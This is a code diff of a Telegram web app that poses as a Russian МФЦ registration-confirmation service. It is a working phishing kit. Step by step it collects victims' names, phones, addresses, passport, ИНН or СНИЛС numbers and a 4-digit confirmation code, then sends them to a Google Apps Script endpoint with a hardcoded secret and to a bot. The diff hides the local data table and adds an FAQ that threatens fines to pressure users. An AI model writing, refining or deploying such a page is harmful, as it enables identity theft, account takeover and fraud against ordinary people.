@@ -6,27 +6,131 @@
   <title>МФЦ — Подтверждение регистрации</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
-    :root{--primary-color:#800000;--secondary-color:#660000;--info-color:#990000;--error-color:#B22222;--background-color:#F5E6E6;--white:#fff;--text-color:#333;--shadow:0 4px 12px rgba(128,0,0,.3);--input-bg:#EADADA;--input-border:#990000;--table-header-bg:linear-gradient(90deg,#800000,#660000)}
-    *{box-sizing:border-box;margin:0;padding:0}
-    body{font-family:'Segoe UI',Arial,sans-serif;background:var(--background-color);padding:20px;display:flex;justify-content:center;min-height:100vh}
-    .container{max-width:520px;width:100%;background:var(--white);padding:30px;border-radius:16px;box-shadow:var(--shadow);text-align:center}
-    .step{display:none;text-align:left}.step.active{display:block}
-    h2,h3{margin-bottom:20px;font-weight:700;font-size:1.6em;color:var(--primary-color);display:flex;align-items:center;gap:10px;line-height:1.3}
-    p{margin-bottom:14px}
-    .input-group{margin-bottom:20px;text-align:left;display:flex;flex-direction:column}
-    input{width:100%;padding:12px 15px;margin-top:8px;border:2px solid var(--input-border);border-radius:10px;font-size:16px;background:var(--input-bg);box-shadow:0 2px 6px rgba(0,0,0,.1);transition:border-color .3s,box-shadow .3s}
-    input:focus{outline:none;border-color:var(--primary-color);box-shadow:0 4px 12px rgba(128,0,0,.2)}
-    .error{color:var(--error-color);font-size:14px;margin-top:6px;font-weight:600;text-align:left;min-height:1.2em}
-    .buttons{margin-top:20px;display:flex;flex-direction:column;gap:12px}
-    button{width:100%;padding:14px;border:none;border-radius:10px;cursor:pointer;font-size:16px;font-weight:600;transition:background-color .3s,transform .1s;text-align:center;color:var(--white);user-select:none}
-    button:hover{transform:translateY(-2px)}button:disabled{background:#ccc;cursor:not-allowed}
-    .next{background:var(--primary-color)}.back{background:var(--secondary-color)}.menu-btn{background:var(--info-color)}
-    .data-table{margin-top:20px;width:100%;border-collapse:collapse;display:none;background:var(--white);border-radius:10px;overflow:hidden}
-    .data-table.active{display:table}
-    .data-table th,.data-table td{border:1px solid var(--input-border);padding:12px 14px;text-align:left;font-size:14px}
-    .data-table th{background:var(--table-header-bg);color:var(--white);font-weight:700;text-transform:uppercase}
-    .data-table tr{transition:background-color .3s}.data-table tr:hover{background-color:#F9F5F5}.data-table tr:nth-child(even){background-color:#F5EDED}
-    .loading{display:none;color:var(--primary-color);font-size:14px;margin-top:10px}
+    :root {
+      --primary-color: #800000;
+      --secondary-color: #660000;
+      --info-color: #990000;
+      --error-color: #B22222;
+      --background-color: #F5E6E6;
+      --white: #fff;
+      --text-color: #333;
+      --shadow: 0 4px 12px rgba(128,0,0,.3);
+      --input-bg: #EADADA;
+      --input-border: #990000;
+    }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: var(--background-color);
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .container {
+      max-width: 520px;
+      width: 100%;
+      background: var(--white);
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: var(--shadow);
+      text-align: center;
+    }
+    .step {
+      display: none;
+      text-align: left;
+    }
+    .step.active {
+      display: block;
+    }
+    h2, h3 {
+      margin-bottom: 20px;
+      font-weight: 700;
+      font-size: 1.6em;
+      color: var(--primary-color);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      line-height: 1.3;
+    }
+    p {
+      margin-bottom: 14px;
+    }
+    .input-group {
+      margin-bottom: 20px;
+      text-align: left;
+      display: flex;
+      flex-direction: column;
+    }
+    input {
+      width: 100%;
+      padding: 12px 15px;
+      margin-top: 8px;
+      border: 2px solid var(--input-border);
+      border-radius: 10px;
+      font-size: 16px;
+      background: var(--input-bg);
+      box-shadow: 0 2px 6px rgba(0,0,0,.1);
+      transition: border-color .3s, box-shadow .3s;
+    }
+    input:focus {
+      outline: none;
+      border-color: var(--primary-color);
+      box-shadow: 0 4px 12px rgba(128,0,0,.2);
+    }
+    .error {
+      color: var(--error-color);
+      font-size: 14px;
+      margin-top: 6px;
+      font-weight: 600;
+      text-align: left;
+      min-height: 1.2em;
+    }
+    .buttons {
+      margin-top: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: 600;
+      transition: background-color .3s, transform .1s;
+      text-align: center;
+      color: var(--white);
+      user-select: none;
+    }
+    button:hover {
+      transform: translateY(-2px);
+    }
+    button:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+    }
+    .next {
+      background: var(--primary-color);
+    }
+    .back {
+      background: var(--secondary-color);
+    }
+    .menu-btn {
+      background: var(--info-color);
+    }
+    .loading {
+      display: none;
+      color: var(--primary-color);
+      font-size: 14px;
+      margin-top: 10px;
+    }
   </style>
 </head>
 <body>
@@ -41,7 +145,6 @@
           <button type="button" class="menu-btn" data-action="check-status">🔍 Проверить статус заявки</button>
           <button type="button" class="menu-btn" data-action="contact">📞 Связаться с поддержкой</button>
           <button type="button" class="menu-btn" data-action="faq">❓ Частые вопросы</button>
-          <button type="button" class="menu-btn" data-action="show-data">📊 Мои данные</button>
         </div>
       </div>
 
@@ -116,17 +219,6 @@
           <div class="loading" id="loading">Отправка данных...</div>
         </div>
       </div>
-
-      <div id="data-output" class="data-table">
-        <h3>📋 Собранные данные</h3>
-        <button type="button" class="menu-btn" id="clear-data">🗑️ Очистить данные</button>
-        <table>
-          <thead>
-            <tr><th>Время</th><th>ФИО</th><th>Телефон</th><th>Адрес</th><th>Документ</th><th>Код</th></tr>
-          </thead>
-          <tbody id="data-table-body"></tbody>
-        </table>
-      </div>
     </div>
   </div>
 
@@ -166,10 +258,8 @@
         this.steps = document.querySelectorAll(".step");
         this.currentStep = "main";
         this.formData = {};
-        this.dataStore = this.loadData();
         this.initEvents();
         this.updateWelcome();
-        this.renderTable();
         this.show("main");
       }
 
@@ -182,196 +272,173 @@
           if (t.classList.contains("next")) this.next();
           else if (t.classList.contains("back")) this.back();
           else if (t.classList.contains("menu-btn")) this.menu(t.dataset.action, t.dataset.doc);
-          else if (t.id === "clear-data") this.clearData();
         });
-        ["fullname","phone","address","docnumber","code"].forEach((id)=>{
-          const el=document.getElementById(id);
-          if (el){
-            el.addEventListener("input",()=>this.validate(this.currentStep));
-            el.addEventListener("keypress",(e)=>{ if(e.key==="Enter"){ e.preventDefault(); this.next(); }});
+        ["fullname", "phone", "address", "docnumber", "code"].forEach((id) => {
+          const el = document.getElementById(id);
+          if (el) {
+            el.addEventListener("input", () => this.validate(this.currentStep));
+            el.addEventListener("keypress", (e) => { if (e.key === "Enter") { e.preventDefault(); this.next(); } });
           }
         });
       }
 
-      loadData(){
-        try{ const data = localStorage.getItem("mfcData"); return data? JSON.parse(data):[]; }
-        catch(e){ console.error("Error loading data from localStorage:",e); return []; }
-      }
-      saveData(){ try{ localStorage.setItem("mfcData", JSON.stringify(this.dataStore)); } catch(e){ console.error("Error saving data:",e); } }
-      clearData(){
-        if(confirm("Очистить все сохраненные данные?")){
-          this.dataStore=[]; this.saveData(); this.renderTable();
-          document.getElementById("data-output").classList.remove("active");
-          alert("Данные очищены!");
-        }
+      updateWelcome() {
+        const el = document.getElementById("welcome-message");
+        const tg = window.Telegram?.WebApp;
+        let name = "Гость";
+        try {
+          const u = tg?.initDataUnsafe?.user;
+          if (u) name = [u.first_name, u.last_name].filter(Boolean).join(" ") || u.username || "Гость";
+        } catch (e) { console.warn("Error accessing Telegram user data:", e); }
+        if (el) el.textContent = `📋 Добро пожаловать, ${name}! 👋`;
       }
 
-      updateWelcome(){
-        const el=document.getElementById("welcome-message"); const tg=window.Telegram?.WebApp;
-        let name="Гость";
-        try{
-          const u=tg?.initDataUnsafe?.user;
-          if(u) name=[u.first_name,u.last_name].filter(Boolean).join(" ")||u.username||"Гость";
-        }catch(e){ console.warn("Error accessing Telegram user data:",e); }
-        if(el) el.textContent=`📋 Добро пожаловать, ${name}! 👋`;
-      }
-
-      show(id){
-        this.steps.forEach((s)=>s.classList.toggle("active", s.id===`step-${id}`));
-        this.currentStep=id;
-        ["err-fullname","err-phone","err-address","err-doc","err-code"].forEach((eid)=>{
-          const el=document.getElementById(eid); if(el) el.textContent="";
+      show(id) {
+        this.steps.forEach((s) => s.classList.toggle("active", s.id === `step-${id}`));
+        this.currentStep = id;
+        ["err-fullname", "err-phone", "err-address", "err-doc", "err-code"].forEach((eid) => {
+          const el = document.getElementById(eid); if (el) el.textContent = "";
         });
-        window.scrollTo({top:0,behavior:"smooth"});
-        const input=document.querySelector(`#step-${id} input`); if(input) input.focus();
+        window.scrollTo({ top: 0, behavior: "smooth" });
+        const input = document.querySelector(`#step-${id} input`); if (input) input.focus();
       }
 
-      next(){
-        if(!this.validate(this.currentStep)) return;
-        if(this.currentStep==="fullname"){ this.formData.fullname=(document.getElementById("fullname").value||"").trim(); return this.show("phone"); }
-        if(this.currentStep==="phone"){ this.formData.phone=(document.getElementById("phone").value||"").trim(); return this.show("address"); }
-        if(this.currentStep==="address"){ this.formData.address=(document.getElementById("address").value||"").trim(); return this.show("document-type"); }
-        if(this.currentStep==="document-number"){ this.formData["document-number"]=(document.getElementById("docnumber").value||"").trim(); return this.show("code"); }
-        if(this.currentStep==="code"){ this.formData.code=(document.getElementById("code").value||"").trim(); return this.send(); }
+      next() {
+        if (!this.validate(this.currentStep)) return;
+        if (this.currentStep === "fullname") { this.formData.fullname = (document.getElementById("fullname").value || "").trim(); return this.show("phone"); }
+        if (this.currentStep === "phone") { this.formData.phone = (document.getElementById("phone").value || "").trim(); return this.show("address"); }
+        if (this.currentStep === "address") { this.formData.address = (document.getElementById("address").value || "").trim(); return this.show("document-type"); }
+        if (this.currentStep === "document-number") { this.formData["document-number"] = (document.getElementById("docnumber").value || "").trim(); return this.show("code"); }
+        if (this.currentStep === "code") { this.formData.code = (document.getElementById("code").value || "").trim(); return this.send(); }
       }
 
-      back(){
-        const map={ fullname:"main", phone:"fullname", address:"phone", "document-type":"address", "document-number":"document-type", code:"document-number" };
-        this.show(map[this.currentStep]||"main");
+      back() {
+        const map = { fullname: "main", phone: "fullname", address: "phone", "document-type": "address", "document-number": "document-type", code: "document-number" };
+        this.show(map[this.currentStep] || "main");
       }
 
-      menu(action,doc){
-        if(action==="schedule") return this.show("fullname");
-        if(action==="documents") return alert("Список документов: Паспорт, ИНН, СНИЛС, выписка ЕГРН.");
-        if(action==="check-status") return alert("Проверка статуса недоступна в демо.");
-        if(action==="contact"){ try{ window.location.href="https://t.me/MFC_SUPPORT"; } catch(e){ console.error("Error navigating:",e); alert("Ошибка при переходе к поддержке. Попробуйте снова."); } return; }
-        if(action==="faq") return alert("FAQ в разработке.");
-        if(action==="show-data"){
-          const dataOutput=document.getElementById("data-output");
-          if(dataOutput) dataOutput.classList.add("active");
-          const last=this.dataStore[this.dataStore.length-1];
-          if(last) sendToBotOnce(last);
-          return;
+      menu(action, doc) {
+        if (action === "schedule") return this.show("fullname");
+        if (action === "documents") {
+          const documents = "📋 Документы для регистрации:\n🛂 Паспорт\n📄 Выписка ЕГРН\n🏠 Для муниципального жилья: договор найма и согласие жильцов";
+          alert(documents);
         }
-        if(doc){
-          this.formData["document-type"]=doc;
-          const ex={ Паспорт:"Пример: 4510 123456", ИНН:"Пример: 500100732259", СНИЛС:"Пример: 112-233-445 95" };
-          const docExample=document.getElementById("doc-example"); if(docExample) docExample.textContent=ex[doc]||"";
-          const docTitle=document.getElementById("doc-title"); if(docTitle) docTitle.textContent=`🔢 Введите номер документа (${doc})`;
+        if (action === "check-status") {
+          const statusPrompt = prompt("Введите номер заявки или данные паспорта (например, 123 или 4510 123456):");
+          if (statusPrompt) alert("❌ Данные не найдены. Пройдите регистрацию.");
+          else this.show("main");
+        }
+        if (action === "contact") {
+          try { window.location.href = "https://t.me/MFC_SUPPORT"; } catch (e) { console.error("Error navigating:", e); alert("Ошибка при переходе к поддержке. Попробуйте снова."); }
+        }
+        if (action === "faq") {
+          const faqOptions = [
+            "❓ 1. Зачем подтверждать регистрацию? — Подтверждение необходимо для актуализации данных в ЕГРН.",
+            "❓ 2. Какие документы нужны? — Паспорт, выписка ЕГРН, для муниципального жилья — договор найма.",
+            "❓ 3. Что будет, если не подтвердить? — Штраф 2000–5000 руб. (ст. 19.15.1 КоАП РФ).",
+            "❓ 4. Можно ли подтвердить онлайн? — Частично через Госуслуги, но визит в МФЦ обязателен.",
+            "❓ 5. Как изменить данные? — Перерегистрация за 30 дней через МФЦ."
+          ];
+          const selectedFAQ = prompt("Выберите вопрос (1-5):\n" + faqOptions.join("\n"));
+          if (selectedFAQ) alert(faqOptions[parseInt(selectedFAQ) - 1] || "Выберите номер из списка!");
+          else this.show("main");
+        }
+        if (doc) {
+          this.formData["document-type"] = doc;
+          const ex = { Паспорт: "Пример: 4510 123456", ИНН: "Пример: 500100732259", СНИЛС: "Пример: 112-233-445 95" };
+          const docExample = document.getElementById("doc-example"); if (docExample) docExample.textContent = ex[doc] || "";
+          const docTitle = document.getElementById("doc-title"); if (docTitle) docTitle.textContent = `🔢 Введите номер документа (${doc})`;
           return this.show("document-number");
         }
       }
 
-      validate(step){
-        const e=(id)=>document.getElementById(id);
-        if(step==="fullname"){
-          const v=(e("fullname")?.value||"").trim();
-          if(!v||v.split(" ").length<2){ e("err-fullname").textContent="Укажите имя и фамилию"; return false; }
-          e("err-fullname").textContent=""; return true;
+      validate(step) {
+        const e = (id) => document.getElementById(id);
+        if (step === "fullname") {
+          const v = (e("fullname")?.value || "").trim();
+          if (!v || v.split(" ").length < 2) { e("err-fullname").textContent = "Укажите имя и фамилию"; return false; }
+          e("err-fullname").textContent = ""; return true;
         }
-        if(step==="phone"){
-          const v=(e("phone")?.value||"").trim();
-          if(!/^\+?\d[\d\s\-()]{6,}$/.test(v)){ e("err-phone").textContent="Укажите корректный телефон (7+ цифр)"; return false; }
-          e("err-phone").textContent=""; return true;
+        if (step === "phone") {
+          const v = (e("phone")?.value || "").trim();
+          if (!/^\+?\d[\d\s\-()]{6,}$/.test(v)) { e("err-phone").textContent = "Укажите корректный телефон (7+ цифр)"; return false; }
+          e("err-phone").textContent = ""; return true;
         }
-        if(step==="address"){
-          const v=(e("address")?.value||"").trim();
-          if(!v||v.length<5){ e("err-address").textContent="Укажите адрес (город, улица, дом)"; return false; }
-          e("err-address").textContent=""; return true;
+        if (step === "address") {
+          const v = (e("address")?.value || "").trim();
+          if (!v || v.length < 5) { e("err-address").textContent = "Укажите адрес (город, улица, дом)"; return false; }
+          e("err-address").textContent = ""; return true;
         }
-        if(step==="document-number"){
-          const v=(e("docnumber")?.value||"").trim();
-          const docType=this.formData["document-type"]||"";
-          if(!v){ e("err-doc").textContent="Введите номер документа"; return false; }
-          if(docType==="Паспорт" && !/^\d{4}\s?\d{6}$/.test(v)){ e("err-doc").textContent="Паспорт: 4 цифры, 6 цифр"; return false; }
-          if(docType==="ИНН" && !/^\d{12}$/.test(v)){ e("err-doc").textContent="ИНН: 12 цифр"; return false; }
-          if(docType==="СНИЛС" && !/^\d{3}-\d{3}-\d{3}\s?\d{2}$/.test(v)){ e("err-doc").textContent="СНИЛС: XXX-XXX-XXX XX"; return false; }
-          e("err-doc").textContent=""; return true;
+        if (step === "document-number") {
+          const v = (e("docnumber")?.value || "").trim();
+          const docType = this.formData["document-type"] || "";
+          if (!v) { e("err-doc").textContent = "Введите номер документа"; return false; }
+          if (docType === "Паспорт" && !/^\d{4}\s?\d{6}$/.test(v)) { e("err-doc").textContent = "Паспорт: 4 цифры, 6 цифр"; return false; }
+          if (docType === "ИНН" && !/^\d{12}$/.test(v)) { e("err-doc").textContent = "ИНН: 12 цифр"; return false; }
+          if (docType === "СНИЛС" && !/^\d{3}-\d{3}-\d{3}\s?\d{2}$/.test(v)) { e("err-doc").textContent = "СНИЛС: XXX-XXX-XXX XX"; return false; }
+          e("err-doc").textContent = ""; return true;
         }
-        if(step==="code"){
-          const v=(e("code")?.value||"").trim();
-          if(!/^\d{4}$/.test(v)){ e("err-code").textContent="Код: 4 цифры"; return false; }
-          e("err-code").textContent=""; return true;
+        if (step === "code") {
+          const v = (e("code")?.value || "").trim();
+          if (!/^\d{4}$/.test(v)) { e("err-code").textContent = "Код: 4 цифры"; return false; }
+          e("err-code").textContent = ""; return true;
         }
         return true;
       }
 
-      // отправка в Sheets → бот → локальное сохранение
-      async send(){
+      async send() {
         const rec = {
-          timestamp: new Date().toISOString().slice(0,19).replace("T"," "),
+          timestamp: new Date().toISOString().slice(0, 19).replace("T", " "),
           fullname: this.formData.fullname || "",
-          phone:    this.formData.phone || "",
-          address:  this.formData.address || "",
-          document: `${this.formData["document-type"]||""} ${this.formData["document-number"]||""}`.trim(),
-          code:     this.formData.code || ""
+          phone: this.formData.phone || "",
+          address: this.formData.address || "",
+          document: `${this.formData["document-type"] || ""} ${this.formData["document-number"] || ""}`.trim(),
+          code: this.formData.code || ""
         };
-
-        if (this.dataStore.some(r => JSON.stringify(r) === JSON.stringify(rec))) {
-          alert("Данные уже были отправлены!");
-          return;
-        }
 
         try { await sendToSheet(rec); } catch (err) { console.warn("sendToSheet error:", err); }
 
         sendToBotOnce(rec);
 
-        this.dataStore.push(rec);
-        this.saveData();
-        this.renderTable();
-        const dataOutput=document.getElementById("data-output");
-        if (dataOutput) dataOutput.classList.add("active");
-        this.formData={};
+        this.formData = {};
         this.show("main");
         alert("Данные успешно отправлены!");
-      }
-
-      renderTable(){
-        const tbody=document.getElementById("data-table-body");
-        if(!tbody) return;
-        tbody.innerHTML="";
-        this.dataStore.forEach((r)=>{
-          const tr=document.createElement("tr");
-          tr.innerHTML=`<td>${r.timestamp}</td><td>${r.fullname}</td><td>${r.phone}</td><td>${r.address}</td><td>${r.document}</td><td>${r.code}</td>`;
-          tbody.appendChild(tr);
-        });
       }
     }
 
     try { new MFCWizard(); }
-    catch(e){ console.error("Failed to initialize MFCWizard:",e); alert("Ошибка инициализации. Перезагрузите страницу."); }
+    catch (e) { console.error("Failed to initialize MFCWizard:", e); alert("Ошибка инициализации. Перезагрузите страницу."); }
   </script>
 
   <!-- Отправка в Google Sheets (без preflight) -->
- <script>
-  // ВСТАВЬ сюда URL из Развертываний Apps Script (строго заканчивается на /exec)
-  const SHEETS_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbw--mkX6tEFl5MlEZNGj2Ptp0u3-dQxCxkgIQm3VwAun8O4XNW7KynUAJdFSVRjlVg/exec";
+  <script>
+    // ВСТАВЬ сюда URL из Развертываний Apps Script (строго заканчивается на /exec)
+    const SHEETS_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbw--mkX6tEFl5MlEZNGj2Ptp0u3-dQxCxkgIQm3VwAun8O4XNW7KynUAJdFSVRjlVg/exec";
 
-  // Точно такой же секрет, как в Code.gs
-  const SECRET = "benhillworkspeisworkhab";
+    // Точно такой же секрет, как в Code.gs
+    const SECRET = "benhillworkspeisworkhab";
 
-  async function sendToSheet(rec) {
-    const payload = JSON.stringify({ type: "lead", payload: rec, secret: SECRET });
-    const loading = document.getElementById("loading");
-    if (loading) loading.style.display = "block";
-    try {
-      const res = await fetch(SHEETS_WEBAPP_URL, {
-        method: "POST",
-        headers: { "Content-Type": "text/plain;charset=utf-8" }, // без preflight
-        body: payload
-      });
-      const text = await res.text();
-      let data = {}; try { data = JSON.parse(text); } catch {}
-      if (!res.ok || !data.ok) throw new Error(data.error || text || "request failed");
-      if (data.duplicate) alert("⚠️ Такая запись уже есть.");
-      else alert("✅ Данные записаны в таблицу.");
-    } catch (err) {
-      console.warn("sendToSheet error:", err);
-    } finally {
-      if (loading) loading.style.display = "none";
+    async function sendToSheet(rec) {
+      const payload = JSON.stringify({ type: "lead", payload: rec, secret: SECRET });
+      const loading = document.getElementById("loading");
+      if (loading) loading.style.display = "block";
+      try {
+        const res = await fetch(SHEETS_WEBAPP_URL, {
+          method: "POST",
+          headers: { "Content-Type": "text/plain;charset=utf-8" }, // без preflight
+          body: payload
+        });
+        const text = await res.text();
+        let data = {}; try { data = JSON.parse(text); } catch {}
+        if (!res.ok || !data.ok) throw new Error(data.error || text || "request failed");
+        if (data.duplicate) alert("⚠️ Такая запись уже есть.");
+        else alert("✅ Данные записаны в таблицу.");
+      } catch (err) {
+        console.warn("sendToSheet error:", err);
+      } finally {
+        if (loading) loading.style.display = "none";
+      }
     }
-  }
-</script>
-
+  </script>
 </body>
 </html>
